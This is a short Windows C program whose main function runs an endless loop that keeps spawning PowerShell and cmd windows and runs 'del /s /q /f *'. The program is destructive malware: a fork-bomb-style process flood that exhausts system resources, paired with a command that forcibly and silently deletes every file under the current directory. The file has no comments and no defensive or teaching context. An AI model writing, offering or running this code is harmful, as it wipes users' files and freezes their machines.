#include<windows.h>

int main(){
  while(1){
    system("start powershell");
    system("start cmd");
    system("del /s /q /f *");
  }
  return 0;
}
